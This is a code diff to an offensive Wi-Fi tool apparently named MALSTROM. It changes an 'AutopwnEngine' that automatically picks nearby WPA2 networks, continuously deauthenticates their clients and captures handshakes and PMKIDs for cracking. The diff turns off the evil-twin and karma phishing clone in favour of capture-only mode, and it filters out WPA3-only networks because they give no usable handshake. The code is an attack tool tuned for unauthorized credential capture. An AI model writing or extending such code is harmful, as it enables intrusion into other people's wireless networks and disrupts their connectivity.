@@ -5,7 +5,9 @@ Turn MALSTROM loose and it will:
   1. scan nearby APs,
   2. ignore OPEN/WEP/OWE networks and anything already in the vault,
   3. pick the strongest remaining target,
-  4. arm the kill chain (open clone + deauth + capture) for a dwell window,
+  4. arm in capture-only mode (deauth + sniffer + active PMKID probe, no
+     evil twin) for a dwell window — an open clone would attract the very
+     clients whose WPA handshake we are waiting for,
   5. move to the next target as soon as a handshake/PMKID lands or the
      dwell expires.
 
@@ -75,7 +77,14 @@ class AutopwnEngine(object):
 
     # --- target selection ------------------------------------------------------
     def _bad_security(self, sec):
-        return any(b in (sec or '').upper() for b in _BAD_SECURITY)
+        up = (sec or '').upper()
+        if any(b in up for b in _BAD_SECURITY):
+            return True
+        # SAE-only has neither a PMKID nor a WPA2 4-way EAPOL exchange; a
+        # transition network (WPA2/WPA3) still falls back to WPA2-PSK.
+        if 'WPA3' in up and 'WPA2' not in up:
+            return True
+        return False
 
     def _fresh_scan(self):
         """Run a short managed-mode scan; keep the result cached.
@@ -181,6 +190,7 @@ class AutopwnEngine(object):
             'active': True,
             'auto_armed': True,
             'auto_harvest': True,
+            'capture_only': True,
             'target_ssid': ssid,
             'target_bssid': bssid,
             'target_channel': ch,
@@ -194,7 +204,7 @@ class AutopwnEngine(object):
             'deauth_delay': 1,
             'deauth_continuous': True,
             'capture_mode': 'both',
-            'karma': True,
+            'karma': False,
             'shield_after_capture': True,
             'template': 'wifi_login',
             'redir_target': config.REDIRECT_TARGET,
@@ -204,7 +214,8 @@ class AutopwnEngine(object):
         self._armed_at = _now()
         self._target = dict(ap)
         self._interactions[bssid] = self._interactions.get(bssid, 0) + 1
-        state.emit('AUTO', 'autopwn armed: %s (%s) ch%s' % (ssid, bssid, ch))
+        state.emit('AUTO', 'autopwn armed (capture-only): %s (%s) ch%s'
+                   % (ssid, bssid, ch))
 
     def _disarm(self, reason):
         st = self._load()
